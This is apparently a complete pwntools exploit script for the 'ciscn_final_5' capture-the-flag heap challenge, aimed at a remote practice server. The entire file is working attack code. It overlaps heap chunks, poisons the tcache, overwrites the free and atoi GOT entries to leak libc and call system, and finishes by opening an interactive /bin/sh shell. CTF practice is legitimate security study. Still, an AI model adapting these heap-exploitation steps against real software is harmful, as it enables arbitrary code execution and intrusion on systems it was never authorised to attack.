from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_final_5')
io = remote('node4.buuoj.cn', 26415)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc.so.6')
elf = ELF('ciscn_final_5')
ptr_list = 0x6020e0
puts_plt = elf.plt['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']

def add(index, size, content):
    io.sendlineafter('your choice: ', '1')
    io.sendlineafter('index: ', str(index))
    io.sendlineafter('size: ', str(size))
    io.sendafter('content: ', content)


def delete(index):
    io.sendlineafter('your choice: ', '2')
    io.sendlineafter('index: ', str(index))


def edit(index, content):
    io.sendlineafter('your choice: ', '3')
    io.sendlineafter('index: ', str(index))
    io.sendafter('content: ', content)


def overlap():
    add(16, 0x10, p64(0) + p64(0x31))               # chunk0
    add(1, 0xb0, cyclic(0xb0))                      # chunk1
    delete(1)
    delete(0)                                       # chunk0(fake)
    
def leak_libc():
    global libc_base
    payload = p64(0) + p64(0xc1) + p64(ptr_list)    
    add(0, 0x20, payload)                           # overwrite tcache_list
    add(1, 0xb0, cyclic(0xb0))                      # chunk1
    payload = p64(free_got - 8) + p64(atoi_got - 7) + p64(atoi_got - 6)
    add(2, 0xb0, payload)                           # chunk2(fake)
    edit(0, p64(0) + p64(puts_plt))
    delete(2)
    libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.sym['setvbuf']
    log.success('libc_base: ' + hex(libc_base))
    
    
def pwn():
    system = libc_base + libc.sym['system']
    edit(1, p64(0) + p64(system))
    io.sendlineafter('your choice: ', '/bin/sh')
    io.interactive()
    # gdb.attach(io)
    # pause()


if __name__ == '__main__':
    overlap()
    leak_libc()
    pwn()
